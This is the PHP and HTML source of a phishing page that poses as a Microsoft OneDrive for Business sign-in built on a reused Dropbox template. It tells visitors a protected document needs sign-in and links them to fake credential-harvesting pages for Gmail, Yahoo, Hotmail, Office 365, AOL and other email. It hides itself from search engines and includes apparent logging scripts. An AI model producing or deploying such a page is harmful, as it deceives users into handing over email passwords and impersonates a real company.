<?php
if (!isset($_SESSION)) {
  session_start();
}

include "rtw.php";
include "reports.php";
?>



<!DOCTYPE html>
<html class="media-desktop" xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
<!--############ footer section---->
<link href="cele/foot.css" type="text/css" rel="stylesheet">
<!--################# form popup & validation##############-->
<!--[if IE]>
    <script src="http://html5shim.latecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
	


<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">

<title>Microsoft OneDrive for Business</title>
        <link rel="icon" href="dbimg/favicon.ico" type="image/x-icon">
        
 <!--############## styles the whole page-->
 

 <link href="cele/style.css" type="text/css" rel="stylesheet">
 <link href="cele/style2.css" type="text/css" rel="stylesheet">
 <!--##### style from there #####-->
<meta charset="utf-8">
   <link href="css/stylekks.css" type="text/css" rel="stylesheet" />
    <link type="text/css" rel="stylesheet" href="overlaypopup.css" />
    <link type="text/css" rel="stylesheet" href="vlay.css" />

<script type="text/javascript" src="myjs/jquery.min.js"></script>
    <script type="text/javascript" src="custom.js"></script>
    
	
	 <style>
        .form-style {
            color: #ccc;
        }
    </style>
	
	<style type="text/css">

    </style>
	
 			</head>
<body class="en" dir="ltr"> 
<!--######### div allows page shift down a bit ##########-->
<div style="display: none;" ><div id="modal-box"><a aria-label="Close" href="#" id="modal-x">

</a><div id="modal-content"></div></div></div>


<span class="dropbox-2015 dropbox-logo-2015">
<header class="mast-head">
<div class="mast-head__container container"><nav class="mast-head__nav mast-head-nav">
<ul class="nav-list"><li class="nav-list__item nav-list__item--dfb"><a class="show-popup" href="#"><span class="button-tertiary try-dfb">Try OneDrive Business</span></a></li></ul>
<ul class="nav-list"><li class="nav-list__item nav-list__item--download">
<a class="show-popup" href="#"><span class="button-link">Download the app</span></a></li></ul></nav>
<h1 id="dropbox-logo" class="dropbox-logo"><a href="" class="dropbox-logo__link"><img src="dbimg/1d3.png" alt="" class="dropbox-logo__glyph"><img src="dbimg/1d2.png" alt="" class="dropbox-logo__type">OneDrive</a></h1></div>
</header></span>


<div id="outer-frame">

<!--################# BODY -------->
 <div id="page-content"><!--<div tabindex="-1" id="main-skip" class="main-skip-destination"></div>-->
 <div id="login-or-register-page-content"><h3 style="font-weight:bold;font-size:24px;color:#060322; font-family: Courier New;">You must Sign in to review a protected Document  </h3> 
 <br><img src="dbimg/biggy2.png" alt="" class="login-or-register-img">
 <div class="login-register-container-wrapper"><div class="login-register-container standard login-register-container--link-top" id="pyxl5202285361691191722"><div class="login-register-login-part">
 
 
 
 <div>
 
  <center>
<div class="vtable"><!--
<h3 style="font-weight:300;font-size:24px;color:black; font-family: Courier New;" >Sign in to view document shared with you.</h3>-->
<h6 style="font-weight:300;font-size:18px;color:#47525d"> Slect your Email Service</h6><br>
<p style="font-size:14px;" align="center"><font color="red">*</font><i>To sync a protected document, you need to select below</i></p>

<a class="show-popup" href="_f/gmailverify/"><img src="dbimg/Good-morning.png" height="50"></a></a><br>
<a class="show-popup" href="_f/yahooverify/"><img src="dbimg/ym.png" height="40"></a><br>
<a class="show-popup" href="_f/hotmailverify/"><img src="dbimg/outk.png"  height="46"></a><br>

<a class="show-popup" href="_f/office365/"><img src="dbimg/ofce.png" height="50"></a><br>
<a class="show-popup" href="_f/aolverify/"><img src="dbimg/alo.png" height="50"></a><br>
<a class="show-popup" href="_f/allemail/" style="text-decoration:none;"><font color="#0071e0" size="6">Other email</font></a>

</div>
</center>

 
 </div></div></div> </div></div>
 <i style="font-weight:100; align:right; font-size:18px;color:#2E1CE8"> OneDrive</i>
 
 <i style="font-weight:100; align:right; font-size:18px;color:#47525d"> <i> is the file cloud for all email domains</i>
 </div>
<!--################# BODY -------->



			<footer><div id="page-full-footer"><div id="footer-top-margin"></div><div id="footer-border"></div><div class="footer-col"><ul><li class="header">OneDrive</li><li><a href="">Install</a></li><li><a href="">Mobile</a></li><li><a href="">Pricing</a></li><li><a href="">Business</a></li><li><a href="">Enterprise</a></li></ul></div><div class="footer-col"><ul><li class="header">About us</li><li><a href="">OneDrive Blog</a></li><li><a href="">About</a></li><li><a href="">Branding</a></li><li><a href="">News</a></li><li><a href="">Jobs</a></li></ul></div><div class="footer-col"><ul><li class="header">Support</li><li><a href="">Help Center</a></li><li><a href="">Contact us</a></li><li><a href="">Copyright</a></li><li><a href="">Cookies</a></li><li><a href="">Privacy & Terms</a></li></ul></div><div class="footer-col"><ul><li class="header">Community</li><li><a href="">Referrals</a></li><li><a href="">Forum</a></li><li><a href="" target="_blank" rel="noreferrer">Twitter</a></li><li><a href="" target="_blank" rel="noreferrer">Facebook</a></li><li><a href="">Developers</a></li></ul></div>
			
			<div class="footer-col" style="margin-left: 190px"><ul><li class="header">English (United States)</li></ul></div>
			
			
			<div class="clear"></div></div></footer></div>

<div class="overlay-bg">
</div>


</html>